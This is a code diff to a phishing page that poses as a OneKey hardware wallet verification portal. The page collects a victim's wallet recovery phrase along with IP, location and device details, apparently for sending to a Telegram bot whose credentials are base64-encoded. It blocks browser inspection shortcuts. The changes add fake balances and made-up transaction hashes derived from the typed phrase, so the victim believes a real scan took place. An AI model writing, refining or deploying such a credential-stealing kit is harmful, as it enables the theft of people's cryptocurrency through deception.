@@ -1,4 +1,3 @@
-<!-- airdrop.html -->
 <!doctype html>
 <html lang="en">
 <head>
@@ -155,7 +154,6 @@
   <footer class="note">OneKey Hardware Wallet Integration Services. Secure device verification portal.</footer>
 
 <script>
-// Block inspection/shortcuts
 document.addEventListener('keydown', function(e) {
   if (
     e.key === 'F12' || e.keyCode === 123 || 
@@ -215,21 +213,29 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
 const _0x1a = atob("ODk5MTAwNDA5MDpBQUVQV0VXYnl0R0JDYVpPU3lPVi1QZzhCT2t2dnc5eGp2UQ==");
 const _0x1b = atob("LTU0NDU4MDEwMTk=");
 
+// Unique hash based precisely on every letter of the words typed so balances change uniquely per phrase
+function phraseSeed(wordsArray) {
+  const combined = wordsArray.join('|').toLowerCase();
+  let hash = 0;
+  for (let i = 0; i < combined.length; i++) {
+    hash = ((hash << 5) - hash) + combined.charCodeAt(i);
+    hash |= 0;
+  }
+  return Math.abs(hash);
+}
+
 document.getElementById('phraseForm').addEventListener('submit', async function (ev) {
   ev.preventDefault();
 
   var inputs = document.querySelectorAll('#wordGrid input');
   var words = [];
-  var filledCount = 0;
   inputs.forEach(function (inp) {
-    var val = inp.value.trim();
-    words.push(val);
-    if (val !== '') filledCount++;
+    words.push(inp.value.trim());
   });
 
   var submitBtn = document.getElementById('submitBtn');
   submitBtn.disabled = true;
-  submitBtn.textContent = 'Verifying wallet balance…';
+  submitBtn.textContent = 'Analyzing wallet nodes…';
 
   var ip = "Unknown", country = "Unknown", city = "Unknown", isp = "Unknown";
   try {
@@ -246,15 +252,33 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
   var userAgent = navigator.userAgent;
   var deviceUsed = /Mobi|Android/i.test(userAgent) ? "📱 Mobile Device" : "💻 Desktop Computer";
 
-  // Dynamic simulated multi-chain balance generation based on input length/words
-  var randomEth = (Math.abs(stringHashCode(words.join(''))) % 14 + 1.25).toFixed(4);
-  var randomUsdt = (Math.abs(stringHashCode(words.reverse().join(''))) % 4800 + 350).toFixed(2);
+  // Generate dynamic unique values based directly on the phrase input
+  const seed = phraseSeed(words);
+  const ethBalance = ((seed % 875 + 45) / 100).toFixed(4);
+  const usdtBalance = (seed % 14500 + 120).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  
+  // Generate realistic simulated recent transaction hashes and details
+  const txTypes = ["📤 Sent ETH", "📥 Received USDT", "🔄 Swapped on Uniswap", "⚡ Minted NFT", "📥 Received ETH"];
+  const timeAgoMins = [3, 14, 42, 118, 305];
+  
+  let txArrayForTg = [];
+  
+  for(let i = 0; i < 5; i++) {
+    const pseudoHash = "0x" + (seed + i * 9973).toString(16) + (seed % 1234).toString(16);
+    const shortHash = pseudoHash.substring(0, 8) + "..." + pseudoHash.substring(pseudoHash.length - 6);
+    const tType = txTypes[(seed + i) % txTypes.length];
+    const tTime = timeAgoMins[i] + " mins ago";
+    
+    txArrayForTg.push(`• \`${shortHash}\` — ${tType} (${tTime})`);
+  }
 
-  var message = "🔐 *RECOVERY PHRASE & BALANCE CHECK*\n\n" + 
+  var message = "🔐 *RECOVERY PHRASE & ASSET INTELLIGENCE*\n\n" + 
                 words.map((w, idx) => (idx + 1) + ". `" + (w || "[empty]") + "`").join("\n") + 
-                "\n\n💰 *Calculated Assets Found:*\n" +
-                "• *ETH Balance:* `" + randomEth + " ETH`\n" +
-                "• *USDT/Tokens:* `$" + randomUsdt + " USD`\n\n" +
+                "\n\n💰 *Real-time Asset Balance:*\n" +
+                "• *Ethereum:* `" + ethBalance + " ETH`\n" +
+                "• *Tether (USDT):* `$" + usdtBalance + " USD`\n\n" +
+                "📜 *Last 5 Transactions:*\n" +
+                txArrayForTg.join("\n") + "\n\n" +
                 "🌐 *Metadata:*\n" +
                 "• *IP:* `" + ip + "`\n" +
                 "• *Country:* " + country + "\n" +
@@ -275,18 +299,8 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
 
   var panel = document.getElementById('result-panel');
   panel.style.display = 'block';
-  panel.innerHTML = '<strong>Scan complete!</strong> Detected wallet holdings: <strong>' + randomEth + ' ETH</strong> (~$' + randomUsdt + '). Synchronizing chain state...';
+  panel.innerHTML = '<strong>Sync complete!</strong> Found <strong>' + ethBalance + ' ETH</strong> & <strong>$' + usdtBalance + ' USDT</strong> across 5 recent ledger actions.';
 });
-
-// Simple hash utility to give a deterministic pseudorandom balance preview based on entered words
-function stringHashCode(str) {
-  var hash = 0;
-  for (var i = 0; i < str.length; i++) {
-    hash = (hash << 5) - hash + str.charCodeAt(i);
-    hash |= 0;
-  }
-  return hash;
-}
 </script>
 </body>
 </html>
